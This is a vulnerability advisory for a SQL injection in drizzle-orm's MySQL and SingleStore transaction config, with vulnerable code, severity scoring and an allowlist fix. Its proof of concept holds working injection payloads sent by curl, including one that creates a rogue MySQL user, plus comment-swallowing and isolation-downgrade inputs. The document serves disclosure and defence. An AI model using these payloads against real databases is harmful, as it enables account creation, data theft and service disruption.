# Title

SQL injection in `drizzle-orm` `db.transaction()` via `MySqlTransactionConfig.isolationLevel` and `accessMode` interpolated through `sql.raw()`

### Summary

`db.transaction(cb, config)` accepts a `MySqlTransactionConfig` whose `isolationLevel` and `accessMode` fields are constrained at the type level to enum strings but are concatenated into the wire SQL through `sql.raw()` with no runtime validation. TypeScript types disappear at runtime, so any application that derives that config from request-influenced data passes attacker input straight into a `SET TRANSACTION` or `START TRANSACTION` statement.

When the underlying `mysql2` connection uses `multipleStatements: true` (a documented option used by batch migration runners and many production stacks), the injection becomes classic stacked-statement SQL injection. Even with multi-statement off, the attacker can downgrade isolation to `READ UNCOMMITTED` (cross-tenant read of in-flight writes), flip the transaction to `READ ONLY` (DoS / state corruption), inject MySQL optimizer hints that suppress indexes, or open block comments that swallow trailing SQL the library emitted.

### Details

In `targets/drizzle-orm/drizzle-orm/src/mysql-core/session.ts:215-237`:

```ts
protected getSetTransactionSQL(config: MySqlTransactionConfig): SQL | undefined {
    const parts: string[] = [];
    if (config.isolationLevel) {
        parts.push(`isolation level ${config.isolationLevel}`);
    }
    return parts.length ? sql`set transaction ${sql.raw(parts.join(' '))}` : undefined;
}

protected getStartTransactionSQL(config: MySqlTransactionConfig): SQL | undefined {
    const parts: string[] = [];
    if (config.withConsistentSnapshot) parts.push('with consistent snapshot');
    if (config.accessMode)             parts.push(config.accessMode);
    return parts.length ? sql`start transaction ${sql.raw(parts.join(' '))}` : undefined;
}
```

The same shape exists at `targets/drizzle-orm/drizzle-orm/src/singlestore-core/session.ts:216-237`.

The `mysql2` adapter routes every `db.transaction(cb, config)` call through these helpers (`targets/drizzle-orm/drizzle-orm/src/mysql2/session.ts:301-305`). Whatever string the caller supplies in `isolationLevel` or `accessMode` lands after `set transaction isolation level` or `start transaction` on the wire.

The TypeScript signature pins `isolationLevel` to a 4-value union and `accessMode` to a 2-value union. Those types are erased at runtime. Any code path that hands the config object through JSON parsing, a generic config loader, an `Object.assign` from request data, or an Express middleware like `app.use((req,_,n)=>{req.tx=req.body.tx;n();})` silently accepts attacker strings.

### PoC

Runnable service at `poc/services/svc2-tx-config-injection/`. The service has a `POST /export` endpoint that runs an export inside `db.transaction(cb, { isolationLevel: req.body.isolationLevel })`, a common "admin picks isolation level per export" pattern. The underlying `mysql2` connection is configured with `multipleStatements: true`.

```
cd poc/services
docker compose up -d mysql
cd svc2-tx-config-injection && npm install && node index.js   # listens on :3002

curl http://127.0.0.1:3002/users

curl -X POST http://127.0.0.1:3002/export \
  -H 'content-type: application/json' \
  -d $'{"isolationLevel":"serializable; CREATE USER \\'pwn\\'@\\'%\\' IDENTIFIED BY \\'pwn\\'; --"}'

curl http://127.0.0.1:3002/users
```

Wire SQL Drizzle sent to MySQL:

```
SET TRANSACTION isolation level serializable; CREATE USER 'pwn'@'%' IDENTIFIED BY 'pwn'; --
```

After the second curl, the `pwn` MySQL account exists.

Without `multipleStatements: true`, the same endpoint remains exploitable. `{"isolationLevel":"read uncommitted"}` silently downgrades isolation and lets the transaction read other transactions' uncommitted writes. `{"isolationLevel":"read uncommitted /*"}` opens a block comment that swallows Drizzle's subsequent `BEGIN`. `{"accessMode":"read only"}` against `start transaction` causes every write inside the callback to fail mid-flow.

### Impact

With `mysql2` `multipleStatements: true`, this is full classic SQL injection. The attacker executes any SQL the database account can execute: `CREATE USER`, `GRANT`, `DROP DATABASE`, arbitrary `INSERT` / `UPDATE` / `DELETE` against any table, file read via `LOAD_FILE` if `FILE` is granted, file write via `SELECT ... INTO OUTFILE`.

Without `multipleStatements`, the attacker can still cause confidentiality and availability damage. `READ UNCOMMITTED` exposes other transactions' uncommitted writes (cross-tenant data read). `READ ONLY` flipped on `START TRANSACTION` causes every subsequent `INSERT` / `UPDATE` / `DELETE` inside the application's callback to fail, often mid-flow, leaving half-applied state in the rest of the system. Block-comment injection (`isolation level read uncommitted /*`) can swallow trailing SQL the library emitted, including the `BEGIN` itself.

The bug applies uniformly to every consumer of `drizzle-orm/mysql2` and `drizzle-orm/singlestore` that calls `db.transaction(cb, config)` with a config that is influenced by request data, including request headers, JSON bodies, query strings, or any intermediate config layer.

### Affected products

Ecosystem: npm.
Package name: `drizzle-orm`.
Affected versions: `<= 0.45.3` (the `mysql-core` and `singlestore-core` session implementations).
Patched versions: none at time of report.

### Severity

CVSS 3.1 vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (score 8.8, High).

The score reflects the `multipleStatements: true` deployment, which is the documented mode for batch migration runners and many production stacks. Without multi-statement, the realistic impact drops closer to `C:H/I:L/A:H` (around 7.5) because cross-tenant reads and transaction DoS remain available.

### Weaknesses

CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection).

### Fix

Validate `isolationLevel` and `accessMode` against a literal-string allowlist before concatenation:

```ts
const VALID_ISO = new Set([
    'read uncommitted', 'read committed', 'repeatable read', 'serializable',
]);
const VALID_ACCESS = new Set(['read only', 'read write']);

if (config.isolationLevel && !VALID_ISO.has(config.isolationLevel)) {
    throw new Error(`Invalid isolationLevel: ${config.isolationLevel}`);
}
if (config.accessMode && !VALID_ACCESS.has(config.accessMode)) {
    throw new Error(`Invalid accessMode: ${config.accessMode}`);
}
```

Apply the same in `singlestore-core/session.ts`.
